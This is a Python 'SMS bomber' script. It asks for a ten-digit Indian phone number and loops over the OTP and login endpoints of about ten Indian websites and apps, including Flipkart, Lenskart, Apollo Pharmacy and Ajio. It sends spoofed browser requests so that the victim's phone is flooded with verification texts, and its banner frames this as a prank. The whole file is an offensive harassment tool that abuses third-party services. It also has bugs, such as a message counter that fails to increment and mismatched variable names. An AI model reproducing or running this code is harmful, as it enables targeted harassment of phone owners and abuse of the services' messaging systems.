try: import requests
except: print("Importing requests failed Please install requests using - pip install requests")
import json

class Bomber:
	useragent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36"
	acceptlanguage = "en-GB,en-US;q=0.9,en;q=0.8"

	def __init__(self,user_mobile,number_of_messege):
		self.user_mobile = user_mobile
		self.number_of_messege = number_of_messege


	def _checkinternet(self):
		try:
			requests.get("https://www.google.com")
			return True
		except:
			print("Check your internet connection and the modules")
			return False

	
	def flipkart(self):
		url = "https://rome.api.flipkart.com/api/7/user/otp/generate"
		flipkart_header = {
		"Accept": "*/*",
		"Accept-Encoding": "gzip, deflate, br",
		"Accept-Language": self.acceptlanguage,
		"Connection": "keep-alive",
		"Content-Length": "53",
		"Content-Type": "application/json",
		"DNT": "1",
		"Host": "rome.api.flipkart.com",
		"Origin": "https://www.flipkart.com",
		"Referer": "https://www.flipkart.com/",
		"Sec-Fetch-Dest": "empty",
		"Sec-Fetch-Mode": "cors",
		"Sec-Fetch-Site": "same-site",
		"User-Agent": self.useragent,
		"X-user-agent": self.useragent + " FKUA/website/42/website/Desktop"
		}
		try:
			request =  requests.post(url, data  = json.dumps( {"loginId":"+91" + self.user_mobile}) , headers = flipkart_header)
		except:
			return False
		if(request.status_code ==  200 ):
			return True



	def confirmtkt(self):
		url = "https://securedapi.confirmtkt.com/api/platform/registerOutput?mobileNumber=" + self.user_mobile + "&newOtp=true"
		confirmtkt_header = {
		"Accept": "*/*",
		"Accept-Encoding": "gzip, deflate, br",
		"Accept-Language": self.acceptlanguage,
		"Connection": "keep-alive",
		"DNT": "1",
		"Host": "securedapi.confirmtkt.com",
		"Origin": "https://www.confirmtkt.com",
		"Referer": "https://www.confirmtkt.com/rbooking-d/trips",
		"Sec-Fetch-Dest": "empty",
		"Sec-Fetch-Mode": "cors",
		"Sec-Fetch-Site": "same-site",
		"User-Agent": self.useragent
		}
		try:
			request = requests.get(url ,headers=confirmtkt_header)
		except:
			return False
		if(request.status_code==200):
			return True


	def lenskart(self):
		url = "https://api.lenskart.com/v2/customers/sendOtp"
		lenskat_header = {
			"accept": "application/json, text/plain, */*",
			"accept-encoding": "gzip, deflate, br",
			"accept-language": self.acceptlanguage,
			"content-length": "26",
			"content-type": "application/json;charset=UTF-8",
			"dnt": "1",
			"origin": "https://www.lenskart.com",
			"referer": "https://www.lenskart.com/",
			"sec-fetch-dest": "empty",
			"sec-fetch-mode": "cors",
			"sec-fetch-site": "same-site",
			"user-agent": self.useragent,
			"x-api-client": "desktop",
			"x-b3-traceid": "991589389250988",
			"x-session-token": "85d09926-3a73-4dbe-9f30-86b9f29f4a67"
			}
		try:
			request = requests.post(url, data=json.dumps({"telephone":self.user_mobile}),headers = lenskat_header)
		except:
			return False
		if(request.status_code==200):
			return True

	def justdial(self):
		url = "https://www.justdial.com/functions/whatsappverification.php"
		justdial_header = {
			"accept": "*/*",
			"accept-encoding": "gzip, deflate, br",
			"accept-language": self.acceptlanguage,
			"content-length": "38",
			"content-type": "application/x-www-form-urlencoded; charset=UTF-8",
			"origin": "https://www.justdial.com",
			"referer": "https://www.justdial.com/",
			"sec-fetch-dest": "empty",
			"sec-fetch-mode": "cors",
			"sec-fetch-site": "same-origin",
			"user-agent": self.useragent,
			"x-requested-with": "XMLHttpRequest",
		}
		try:
			r = requests.post(url, data="mob="+ self.user_mobile +"&vcode=&rsend=0&name=deV", headers=justdial_header)
		except:
			return False
		if(r.status_code==200):
			return True

	def indialends(self):
		url = "https://indialends.com/internal/a/otp.ashx"
		indialends_header = {
			"accept": "*/*",
			"accept-encoding": "gzip, deflate, br",
			"accept-language": self.acceptlanguage,
			"Connection": "keep-alive",
			"content-length": "26",
			"content-type": "application/x-www-form-urlencoded",
			"dnt": "1",
			"Host": "indialends.com",
			"origin": "https://www.indialends.com",
			"referer": "https://www.indialends.com/",
			"sec-fetch-dest": "empty",
			"sec-fetch-mode": "cors",
			"sec-fetch-site": "same-origin",
			"user-agent": self.useragent,
			"x-requested-with": "XMLHttpRequest",
		}
		try:
			r = requests.post(url, data="log_mode=1&ctrl="+self.user_mobile, headers=indialends_header)
		except:
			return False
		if(r.status_code==200):
			return True

	def apolopharmacy(self):
		url = "https://www.apollopharmacy.in/sociallogin/mobile/sendotp"
		apolopharmacy_header = {
			"accept": "*/*",
			"accept-encoding": "gzip, deflate, br",
			"accept-language": self.acceptlanguage,
			"Connection": "keep-alive",
			"content-length": "17",
			"content-type": "application/x-www-form-urlencoded; charset=UTF-8",
			"dnt": "1",
			"origin": "https://www.apollopharmacy.in",
			"referer": "https://www.apollopharmacy.in/",
			"sec-fetch-dest": "empty",
			"sec-fetch-mode": "cors",
			"sec-fetch-site": "same-origin",
			"user-agent": self.useragent,
			"x-requested-with": "XMLHttpRequest",
		}
		try:
			request = requests.post(url, data="mobile=" + self.user_mobile, headers=apolopharmacy_header)
		except:
			return False
		if (request.status_code == 200):
			return True

	def magicbrick(self):
		url = "https://accounts.magicbricks.com/userauth/api/validate-mobile"
		magicbrike_header = {
			"accept": "application/json, text/javascript, */*; q=0.01",
			"accept-encoding": "gzip, deflate, br",
			"accept-language": self.acceptlanguage,
			"content-length": "20",
			"content-type": "application/x-www-form-urlencoded; charset=UTF-8",
			"dnt": "1",
			"origin": "https://accounts.magicbricks.com",
			"referer": "https://accounts.magicbricks.com/userauth/login",
			"sec-fetch-dest": "empty",
			"sec-fetch-mode": "cors",
			"sec-fetch-site": "same-origin",
			"user-agent": self.useragent,
			"x-requested-with": "XMLHttpRequest"
		}
		try:
			request = requests.post(url, data="ubimobile="+ self.user_mobile, headers=magicbrike_header)
		except:
			return False
		if(request.status_code==200):
			return True

	def ajio(self):
		url = "https://login.web.ajio.com/api/auth/generateLoginOTP"
		ajio_header = {
			"accept": "application/json     ",
			"accept-encoding": "gzip, deflate, br",
			"accept-language": self.acceptlanguage,
			"Connection": "keep-alive",
			"content-length": "29",
			"content-type": "application/json",
			"Host": "login.web.ajio.com",
			"dnt": "1",
			"origin": "https://www.ajio.com",
			"referer": "https://www.ajio.com/",
			"sec-fetch-dest": "empty",
			"sec-fetch-mode": "cors",
			"sec-fetch-site": "same-site",
			"user-agent": self.useragent
		}
		try:
			request = requests.post(url, data=json.dumps({"mobileNumber": self.user_mobile}), headers=ajio_header)
		except:
			return False
		if (request.json()['success']):
			return True
		return False


	def mylescars(self):
		url = "https://www.mylescars.com/usermanagements/chkContact"
		ajio_header = {
			"accept": "*/*",
			"accept": "application/json",
			"accept-encoding": "gzip, deflate, br",
			"accept-language": self.acceptlanguage,
			"content-length": "20",
			"content-type": "application/x-www-form-urlencoded; charset=UTF-8",
			"dnt": "1",
			"origin": "https://www.mylescars.com",
			"referer": "https://www.mylescars.com/",
			"sec-fetch-dest": "empty",
			"sec-fetch-mode": "cors",
			"sec-fetch-site": "same-origin",
			"user-agent": self.useragent,
			"x-requested-with": "XMLHttpRequest"
		}
		try:
			request = requests.post(url, data="contactNo="+ self.user_mobile, headers=ajio_header)
		except:
			return False
		if(request.status_code==200):
			return True

	def unacademy(self):
		url = "https://unacademy.com/api/v1/user/get_app_link/"
		ajio_header = {
			"accept": "application/json",
			"accept-encoding": "gzip, deflate, br",
			"accept-language": self.acceptlanguage,
			"Connection": "keep-alive",
			"content-length": "107",
			"content-type": "application/json",
			"dnt": "1",
			"origin": "https://unacademy.com",
			"referer": "https://unacademy.com",
			"sec-fetch-dest": "empty",
			"sec-fetch-mode": "cors",
			"sec-fetch-site": "same-origin",
			"user-agent": self.useragent
		}
		try:
			request = requests.post(url, data=json.dumps({"phone": self.user_mobile}), headers=ajio_header)
		except:
			return False
		if(request.status_code==200):
			return True

	def startBombing(self):
		if(self._checkinternet()):
			counter = 0
			while True:
				if self.flipkart():
					counter+=1
					print("Sent !!!!!")
				if self.confirmtkt():
					counter+=1
					print("Sent !!!!!")
				if self.lenskart():
					counter+=1
					print("Sent !!!!!")
				if self.justdial():
					print("Sent !!!!!")
					counter+=1
				if self.indialends():
					print("Sent !!!!!")
					counter+=1
				if self.apolopharmacy():
					print("Sent !!!!!")
					counter+=1
				if self.magicbrick():
					print("Sent !!!!!")
					counter+=1
				if self.apolopharmacy():
					print("Sent !!!!!")
					counter+=1
				if self.magicbrick():
					print("Sent !!!!!")
					counter+1
				if self.mylescars():
					counter+=1
					print("Sent !!!!!")
				if self.unacademy():
					print("Sent !!!!!")
					counter+=1
				if(counter == number_of_messege):
					break

											#["flipkart","confirmtkt","lenskart","justdial","indialends","apolopharmacy","magicbrick","ajio","mylescars","unacademy"]:
		else:
			print("possible errors -  Internet connectivity")


print("                                             ")
print("   Messge Bomber Script Made by      D 3 V   ")
print("                                             ")
print("Use this for prank not for revenge-----------")
print( "        https://github.com/Devn913          ")


while True:
	try:
		usermobile = input("Enter the number (without country code) : ")
		if(len(usermobile)==10 and usermobile.isdigit()): break
	except:
		print("Please check your input !!")
number_of_messge = 100
try:
	number_of_messege = int(input("Enter the number of messege you want to send   ( leave empty for default) : "))
except:
	pass
if(number_of_messge>500):
	number_of_messge=200
bomber = Bomber(usermobile,number_of_messge)
bomber.startBombing()
print(" Finished Please run the script again ")

